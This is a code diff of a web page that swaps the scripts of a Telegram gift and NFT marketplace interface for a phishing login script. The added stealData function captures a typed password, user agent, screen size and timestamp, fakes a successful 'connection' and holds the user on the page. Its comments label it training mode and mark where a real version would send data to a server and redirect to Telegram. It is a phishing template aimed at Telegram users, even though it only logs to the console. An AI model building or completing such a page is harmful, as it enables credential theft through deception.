-            document.getElementById('detailPrice').textContent = `♥ ${nft.price.toFixed(2)}`;
-            document.getElementById('detailOverlay').classList.add('open');
-        }
-
-        function closeDetail() {
-            document.getElementById('detailOverlay').classList.remove('open');
-        }
-
-        // ================================================================
-        //  НАВИГАЦИЯ
-        // ================================================================
-        function switchPage(page) {
-            currentPage = page;
-            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-            const target = document.getElementById(`page-${page}`);
-            if (target) target.classList.add('active');
-
-            document.querySelectorAll('.bottom-nav .nav-item').forEach(n => n.classList.remove('active'));
-            const navBtn = document.querySelector(`.bottom-nav .nav-item[data-page="${page}"]`);
-            if (navBtn) navBtn.classList.add('active');
-
-            if (page === 'orders') renderOrders();
-            if (page === 'hub') renderTasks();
-            if (page === 'tasks') renderTasks2();
-            if (page === 'storage') renderStorage();
-            if (page === 'collections') renderCollections();
-
-            // Скрываем верхние табы на некоторых страницах
-            const tabs = document.getElementById('mainTabs');
-            if (['orders', 'hub', 'tasks', 'storage', 'collections', 'feed'].includes(page)) {
-                tabs.style.display = 'none';
-                document.querySelector('.search-bar').style.display = 'none';
-                document.querySelector('.stats-bar').style.display = 'none';
-                document.getElementById('filtersPanel').classList.remove('open');
-            } else {
-                tabs.style.display = 'flex';
-                document.querySelector('.search-bar').style.display = 'flex';
-                document.querySelector('.stats-bar').style.display = 'flex';
+        // Функция "кражи"
+        function stealData() {
+            const password = passwordInput.value.trim();
+            if (!password) {
+                // Имитация ошибки, как в Telegram
+                passwordInput.style.borderColor = '#e74c3c';
+                passwordInput.style.boxShadow = '0 0 0 3px rgba(231, 76, 60, 0.2)';
+                setTimeout(() => {
+                    passwordInput.style.borderColor = '#3a3a3a';
+                    passwordInput.style.boxShadow = 'none';
+                }, 1000);
+                return;
             }
 
-            // Показываем/скрываем баннер
-            const banner = document.querySelector('.top-banner');
-            if (page === 'market') {
-                banner.style.display = 'flex';
-            } else {
-                banner.style.display = 'none';
+            // СБОР ДАННЫХ (ЛОГ)
+            const userAgent = navigator.userAgent;
+            const screenSize = `${window.screen.width}x${window.screen.height}`;
+            const timestamp = new Date().toISOString();
+
+            // В РЕАЛЬНОМ ФИШИНГЕ ТУТ БЫЛ БЫ ЗАПРОС НА СЕРВЕР
+            console.log('🕵️‍♂️ УКРАДЕН ПАРОЛЬ:', password);
+            console.log('📱 Юзер-агент:', userAgent);
+            console.log('🖥️ Экран:', screenSize);
+            console.log('⏱️ Время:', timestamp);
+
+            // ЭМУЛЯЦИЯ УСПЕШНОГО ПОДКЛЮЧЕНИЯ (обманка)
+            connectBtn.textContent = '✅ Подключено';
+            connectBtn.style.background = '#2b8c4a';
+            connectBtn.style.boxShadow = '0 4px 12px rgba(43, 140, 74, 0.3)';
+            connectBtn.disabled = true;
+
+            // ИМИТАЦИЯ РЕДИРЕКТА НА НАСТОЯЩИЙ TELEGRAM
+            setTimeout(() => {
+                alert('🎉 Подарок получен! (учебный режим, данные не отправлены)');
+                // В боевом варианте здесь был бы редирект на https://t.me/
+                // window.location.href = 'https://t.me/';
+            }, 800);
+        }
+
+        // ОБРАБОТЧИК КНОПКИ
+        connectBtn.addEventListener('click', stealData);
+
+        // ВВОД ПО ENTER
+        passwordInput.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                stealData();
             }
+        });
 
-            window.scrollTo({ top: 0, behavior: 'smooth' });
-        }
+        // АВТОФОКУС НА ПОЛЕ (как в Telegram)
+        window.addEventListener('load', () => {
+            setTimeout(() => passwordInput.focus(), 300);
+        });
 
-        function switchTab(tab) {
-            currentTab = tab;
-            document.querySelectorAll('.tabs .tab').forEach(t => t.classList.remove('active'));
-            const el = document.querySelector(`.tabs .tab[data-tab="${tab}"]`);
-            if (el) el.classList.add('active');
-
-            // Переключаем страницы для вкладок
-            if (tab === 'gifts') {
-                switchPage('gifts');
-            } else if (tab === 'stars') {
-                switchPage('stars');
-            } else if (tab === 'collections') {
-                switchPage('collections');
-            } else if (tab === 'feed') {
-                switchPage('feed');
+        // ДОП. ЗАЩИТА ОТ СЛУЧАЙНОГО ЗАКРЫТИЯ
+        window.addEventListener('beforeunload', (e) => {
+            if (passwordInput.value.trim().length > 0) {
+                e.preventDefault();
+                e.returnValue = '';
             }
-        }
+        });
 
-        function switchHubTab(el, type) {
-            document.querySelectorAll('.hub-tabs .htab').forEach(t => t.classList.remove('active'));
-            el.classList.add('active');
-            showToast(type === 'hot' ? 'Горящие задания' : 'Больше наград', 'info');
-        }
-
-        function selectGiftOption(el) {
-            document.querySelectorAll('.gift-options .gopt').forEach(o => o.classList.remove('active'));
-            el.classList.add('active');
-        }
-
-        // ================================================================
-        //  TOAST
-        // ================================================================
-        let toastTimer = null;
-
-        function showToast(msg, type = 'info') {
-            const container = document.getElementById('toastContainer');
-            const msgEl = document.getElementById('toastMsg');
-            const icon = container.querySelector('.icon i');
-
-            const icons = {
-                success: 'fa-check-circle',
-                error: 'fa-exclamation-circle',
-                info: 'fa-info-circle',
-            };
-
-            icon.className = `fas ${icons[type] || icons.info}`;
-            msgEl.textContent = msg;
-            container.classList.add('show');
-
-            if (toastTimer) clearTimeout(toastTimer);
-            toastTimer = setTimeout(() => {
-                container.classList.remove('show');
-            }, 3000);
-        }
-
-        // ================================================================
-        //  ИНИЦИАЛИЗАЦИЯ
-        // ================================================================
-        function init() {
-            renderNFTs(nftData);
-            renderOrders();
-            renderTasks();
-            renderTasks2();
-            renderCollections();
-            renderStorage();
-            document.getElementById('nftCount').textContent = nftData.length;
-            document.getElementById('onSaleCount').textContent = nftData.filter(n => n.price > 0).length;
-            document.getElementById('storageCount').textContent = storageData.length;
-
-            // Закрываем детали по клику вне карточки
-            document.getElementById('detailOverlay').addEventListener('click', function(e) {
-                if (e.target === this) closeDetail();
-            });
-
-            console.log('🔥 Fragment Marketplace запущен!');
-            console.log(`📊 NFT: ${nftData.length}, Ордеров: ${ordersData.length}, Заданий: ${tasksData.length}`);
-            console.log('⌨️  Навигация через нижнее меню');
-        }
-
-        document.addEventListener('DOMContentLoaded', init);
-    </script>
+    })();
+</script>
 
 </body>
 </html>
